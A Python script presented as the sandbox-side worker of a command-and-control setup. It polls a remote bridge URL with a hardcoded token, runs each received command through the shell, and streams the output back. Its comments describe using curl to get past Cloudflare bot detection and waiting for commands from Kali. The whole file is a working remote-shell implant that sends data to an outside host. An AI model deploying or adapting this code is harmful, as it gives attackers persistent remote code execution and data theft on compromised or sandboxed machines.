#!/usr/bin/env python3
"""
C2 Streaming Worker - Sandbox Side (curl-based to bypass Cloudflare)
Runs in background (nohup), polls for commands, executes them,
and STREAMS output line-by-line to the bridge.
"""

import json
import subprocess
import sys
import os
import time

BRIDGE_URL = "https://elio-acd17217.base44.app/functions/c2Bridge"
TOKEN = "shadow-core-c2-bridge-2026"
POLL_INTERVAL = 1
CMD_TIMEOUT = 600
LOG_FILE = "c2_worker.log"

def api_call(method, data=None, params=None):
    """Call the bridge API using curl (bypasses Cloudflare bot detection)"""
    url = BRIDGE_URL
    
    query_params = {"token": TOKEN}
    if params:
        query_params.update(params)
    url += "?" + "&".join(f"{k}={v}" for k, v in query_params.items())
    
    cmd = ["curl", "-s", "-m", "15", "-X", method, "-H", "Content-Type: application/json"]
    
    if method != "GET":
        payload = json.dumps({**(data or {}), "token": TOKEN})
        cmd.extend(["-d", payload])
    
    cmd.append(url)
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        if result.returncode == 0:
            return json.loads(result.stdout)
        else:
            return {"error": f"curl failed: {result.stderr[:200]}"}
    except Exception as e:
        return {"error": str(e)}

def update_output(cmd_id, output, status):
    """Update command output on the bridge"""
    result = api_call("PUT", {"id": cmd_id, "output": output, "status": status})
    return "error" not in result

def execute_streaming(cmd_id, command):
    """Execute command and stream output line by line"""
    log(f"Executing: {command}")
    
    try:
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        
        output_buffer = ""
        last_update = 0
        
        for line in iter(proc.stdout.readline, ''):
            output_buffer += line
            
            now = time.time()
            if now - last_update > 0.5 or len(output_buffer) > 5000:
                update_output(cmd_id, output_buffer, "executing")
                last_update = now
        
        proc.wait()
        
        if proc.returncode == 124:
            output_buffer += f"\n[TIMEOUT: Command exceeded {CMD_TIMEOUT}s]\n"
            status = "error"
        else:
            status = "completed"
        
        if len(output_buffer) > 90000:
            output_buffer = output_buffer[:90000] + "\n[OUTPUT TRUNCATED]\n"
        
        update_output(cmd_id, output_buffer, status)
        log(f"Done (exit: {proc.returncode}, output: {len(output_buffer)} chars)")
        
    except Exception as e:
        update_output(cmd_id, f"Error: {str(e)}", "error")
        log(f"Exception: {e}")

def log(msg):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {msg}"
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")
    print(line, flush=True)

def main():
    log("=" * 50)
    log("C2 Streaming Worker Started (curl-based)")
    log(f"Bridge: {BRIDGE_URL}")
    log(f"Poll interval: {POLL_INTERVAL}s")
    log(f"Command timeout: {CMD_TIMEOUT}s")
    log("Waiting for commands from Kali...")
    
    while True:
        try:
            result = api_call("GET")
            
            if "error" in result:
                log(f"Poll error: {result['error']}")
                time.sleep(5)
                continue
            
            cmd_id = result.get("id", "")
            command = result.get("command", "")
            
            if cmd_id and command:
                log(f"Received command [ID: {cmd_id}]")
                log(f"Command: {command}")
                execute_streaming(cmd_id, command)
                log("Ready for next command")
            
        except KeyboardInterrupt:
            log("Worker stopped by user")
            break
        except Exception as e:
            log(f"Main loop error: {e}")
            time.sleep(5)
        
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
